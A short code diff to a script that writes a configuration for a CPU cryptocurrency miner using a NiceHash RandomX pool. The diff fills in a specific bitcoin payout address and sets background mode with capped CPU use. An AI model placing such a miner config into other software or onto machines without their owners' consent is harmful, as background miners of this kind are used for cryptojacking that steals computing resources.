@@ -5,7 +5,7 @@ conf = app / "config.json"
 
 cfg = {
     "pools": [{"url":"stratum+tcp://randomxmonero.usa.nicehash.com:3380",
-               "user":"YOUR_BTC_ADDRESS","pass":"x"}],
+               "user":"bc1qqds76wl2lglz540cwkvznyj79ly8k5unc027kr","pass":"x"}],
     "cpu": {"enabled":True,"max-threads-hint":50},
     "background":True,"donate-level":0
 }
